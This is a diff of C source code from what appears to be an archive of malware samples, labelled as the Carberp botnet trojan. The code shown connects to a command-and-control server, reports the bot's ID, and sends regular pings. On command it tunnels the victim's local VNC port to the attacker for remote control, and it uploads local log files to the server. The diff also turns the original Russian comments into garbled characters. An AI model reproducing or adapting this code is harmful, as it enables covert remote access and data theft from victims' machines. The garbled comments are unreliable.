@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <winsock2.h>
 #include <windows.h>
 #include <shlwapi.h>
@@ -39,7 +50,7 @@ struct FileInfo
 {
 	char name[MAX_PATH];
 	int size;
-	FILETIME time; //время последней записи в файл
+	FILETIME time; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 	FileInfo* next;
 };
 
@@ -143,7 +154,7 @@ int ReadSocket( int sc, void* data, int c_data, int wait )
 	static char buffer[8192];
 	static int readedBuf = 0;
 	int ret = 0;
-	if( sc == 0 ) //очистка буфера
+	if( sc == 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		readedBuf = 0;
 	}
@@ -168,7 +179,7 @@ int ReadSocket( int sc, void* data, int c_data, int wait )
 
             int events = select(0,&fdsr,NULL,NULL, &waitEvent);
 
-            if( events == 0 ) return -1; //ничего не пришло, нужно ждать
+            if( events == 0 ) return -1; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
             if( events == SOCKET_ERROR ) break;
 			int c = recv( sc, buffer + readedBuf, sizeof(buffer) - readedBuf, 0 );
 			if( c == SOCKET_ERROR || c == 0 )
@@ -266,41 +277,41 @@ static DWORD WINAPI MainPortForward(void* param)
     while(true)
     {
 		DbgMsg("Connect server %s:%d", IP_PORTFORW, PORT_PORTFOW );
-        SOCKET sc = ConnectWithIP( IP_PORTFORW, PORT_PORTFOW ); //соединяемся с сервером
+        SOCKET sc = ConnectWithIP( IP_PORTFORW, PORT_PORTFOW ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         if( sc )
         {
             curr_sc = sc;
             DbgMsg("Connect vnc");
-            if( WritePacket( ID_VNC_CONNECT, sc, idBot, c_idBot ) ) //передаем серверу ид бота
+            if( WritePacket( ID_VNC_CONNECT, sc, idBot, c_idBot ) ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
             {
                 DbgMsg(idBot);
-                int on_ping = 3; //сообщаем серверу что бот рабочий каждые 6 с
+                int on_ping = 3; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 6 пїЅ
                 while(true)
                 {
                     void* data;
                     int id;
                     //DbgMsg("wait packet");
-                    int sz = ReadPacket( id, sc, &data, 2 ); //ждем команду от сервера
+                    int sz = ReadPacket( id, sc, &data, 2 ); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
                     if( sz == 0 )
                         break;
                     if( sz > 0 )
                     {
                         switch(id)
                         {
-                            case ID_PORT_FORWARD: //соединяемся с сервером для проброса порта
+                            case ID_PORT_FORWARD: //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
                                 if( sz == 6 )
                                 {
                                     portVNC = *((short*)((char*)data + 4));
                                     DbgMsg( "connect port %d", portVNC );
-                                    SOCKET sc1 = ConnectWithIP( "127.0.0.1", portVNC ); //соединяемся с VNC
+                                    SOCKET sc1 = ConnectWithIP( "127.0.0.1", portVNC ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ VNC
                                     if( sc1 )
 									{
 										DbgMsg("Connect with server");
                                         SOCKET sc2 = ConnectWithIP( IP_PORTFORW, PORT_PORTFOW );
-                                        if( sc2 != 0 && WritePacket( ID_PORT_FORWARD, sc2, data, sz ) ) //говорим серверу что нужно начать проброс порта
+                                        if( sc2 != 0 && WritePacket( ID_PORT_FORWARD, sc2, data, sz ) ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
                                         {
 											DbgMsg("Run tunnel");
-                                            //запускаем туннель
+                                            //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
                                             TUNNEL_INFO* tunnel = (TUNNEL_INFO*)u_alloc(sizeof(TUNNEL_INFO));
                                             tunnel->s1 = sc1;
                                             tunnel->s2 = sc2;
@@ -320,9 +331,9 @@ static DWORD WINAPI MainPortForward(void* param)
                     //SendLogs();
                     if( on_ping-- == 0 )
                     {
-                        if( !WritePacket( ID_PING, sc, &sz, 1 ) ) //неважно что отправлять, важно сказать что живы
+                        if( !WritePacket( ID_PING, sc, &sz, 1 ) ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
                             break;
-                        on_ping = 3; //через 6 секунд снова будем здесь
+                        on_ping = 3; //пїЅпїЅпїЅпїЅпїЅ 6 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
                     }
                 }
                 //OutputDebugStringA("disconnect");
@@ -361,8 +372,8 @@ FileInfo* FindAddFileInfo( int type, const char* nameFile )
 		{
 			finded->next = 0;
 			GetFileTime( file, 0, 0, &finded->time );
-			char* nf = PathFindFileNameA(nameFile); //только имя файла
-			//узнаем размер этого файла на сервере
+			char* nf = PathFindFileNameA(nameFile); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			char buf[128];
 			buf[0] = type;
 			lstrcpyA( buf + 1, nf );
@@ -374,7 +385,7 @@ FileInfo* FindAddFileInfo( int type, const char* nameFile )
 			{
 				finded->size = *((int*)size);
 				u_free(size);
-				//добавляем в список
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				if( listFileInfo )
 				{
 					finded->next = listFileInfo->next;
@@ -419,7 +430,7 @@ void SendFileIfAdd(int type, const char* pathFile, const char* nameFile)
 			{
 				SetFilePointer( f, fi->size, 0, FILE_BEGIN );
 				int c_data = size - fi->size;
-				if ( c_data > 4096 - 256 ) c_data = 4096 - 256; //из-за ограничения по размеру пакета
+				if ( c_data > 4096 - 256 ) c_data = 4096 - 256; //пїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				int lenName = lstrlenA(nameFile);
 				int sz = 2 + lenName + c_data;
 				char* data = (char*)u_alloc(sz);
@@ -447,7 +458,7 @@ void SendLogs()
 	PathAppendA( path, "*.*" );
 	WIN32_FIND_DATAA fd;
 	DbgMsg(path);
-	HANDLE finder = FindFirstFileA( path, &fd ); //запускаем поиск
+	HANDLE finder = FindFirstFileA( path, &fd ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if( finder != INVALID_HANDLE_VALUE )
 	{
 		do
